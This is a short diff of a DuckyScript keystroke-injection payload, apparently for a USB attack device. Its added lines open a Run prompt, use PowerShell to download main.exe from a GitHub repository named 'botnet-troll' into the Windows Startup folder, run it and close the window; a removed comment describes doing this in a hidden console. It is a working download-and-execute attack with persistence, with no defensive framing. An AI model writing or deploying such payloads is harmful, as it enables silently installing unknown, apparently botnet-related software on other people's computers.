@@ -1,10 +1,7 @@
-REM using duckyscript, download https://github.com/Hamy-os/botnet-troll/blob/main/main.exe?raw=true in a hidden console into the users shell:startup directory and run it 
-
 GUI r
-STRING shell:startup
-ENTER
-GUI r
-
-STRING powershell
-STRING 
-STRING Invoke-WebRequest -Uri "https://github.com/Hamy-os/botnet-troll/blob/main/main.exe?raw=true"
+STRING $webclient = New-Object System.Net.WebClient
+DELAY 1000
+STRING $webclient.DownloadFile("https://github.com/Hamy-os/botnet-troll/blob/main/output/main.exe?raw=true", "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe")
+DELAY 3000
+STRING Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe"
+ALT F4
